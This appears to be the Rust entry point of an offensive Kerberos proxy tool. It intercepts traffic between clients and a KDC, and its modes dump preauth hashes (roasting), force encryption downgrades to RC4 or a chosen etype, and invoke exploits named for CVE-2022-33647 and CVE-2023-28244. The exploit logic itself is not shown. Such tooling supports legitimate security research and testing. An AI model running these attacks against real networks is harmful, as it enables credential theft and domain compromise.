use std::{io, net::SocketAddr};

use clap::{Parser, ValueEnum};
use kdc_proxy::{
    handler::{
        Cve202233647Handler, Cve202328244Handler, DowngradePaHandler, IdentityHandler,
        RoastActiveHandler, RoastPassiveHandler,
    },
    KdcProxy,
};

#[derive(Debug, Parser)]
struct Args {
    #[arg(short, long, value_enum, default_value_t = Default::default())]
    mode: HandlerMode,
    #[arg(long, allow_hyphen_values = true, required_if_eq("mode", "downgrade"))]
    etype: Option<i32>,
    listen_addr: SocketAddr,
    remote_addr: SocketAddr,
}

#[derive(Clone, Debug, Default, ValueEnum)]
enum HandlerMode {
    #[default]
    LogOnly,
    #[clap(help = "Dump hashes for AS-REQ preauth")]
    RoastPassive,
    #[clap(help = "Attempt downgrade of AS-REQ preauth to RC4 and dump hashes")]
    RoastActive,
    #[clap(help = "Attempt downgrade of AS-REQ preauth to provided <ETYPE> value")]
    DowngradePa,
    //Ritm,
    #[clap(
        name = "cve-2022-33647",
        help = "Attempt CVE-2022-33647 downgrade of TGT session key"
    )]
    Cve202233647,
    #[clap(
        name = "cve-2023-28244",
        help = "Attempt CVE-2023-28244 downgrade of AS-REQ preauth"
    )]
    Cve202328244,
}

#[tokio::main]
async fn main() -> io::Result<()> {
    let args = Args::parse();
    tracing_subscriber::fmt::init();
    match args.mode {
        HandlerMode::LogOnly => {
            KdcProxy::listen(args.listen_addr, args.remote_addr, IdentityHandler {}).await?;
        }
        HandlerMode::RoastPassive => {
            KdcProxy::listen(
                args.listen_addr,
                args.remote_addr,
                RoastPassiveHandler::new(),
            )
            .await?;
        }
        HandlerMode::RoastActive => {
            KdcProxy::listen(
                args.listen_addr,
                args.remote_addr,
                RoastActiveHandler::new(),
            )
            .await?;
        }
        HandlerMode::DowngradePa => {
            KdcProxy::listen(
                args.listen_addr,
                args.remote_addr,
                DowngradePaHandler::new(args.etype.unwrap()),
            )
            .await?;
        }
        HandlerMode::Cve202233647 => {
            KdcProxy::listen(
                args.listen_addr,
                args.remote_addr,
                Cve202233647Handler::new(),
            )
            .await?;
        }
        HandlerMode::Cve202328244 => {
            KdcProxy::listen(
                args.listen_addr,
                args.remote_addr,
                Cve202328244Handler::new(),
            )
            .await?;
        }
    };
    Ok(())
}

// fn parse_etype(src: &str) -> Result<i8, std::num::ParseIntError> {
//     if src.starts_with("0x") {
//         let etype = u8::from_str_radix(src, 16)?;
//         Ok(etype as i8)
//     } else {
//         let etype = i8::from_str_radix(src, 10)?;
//         Ok(etype)
//     }
// }
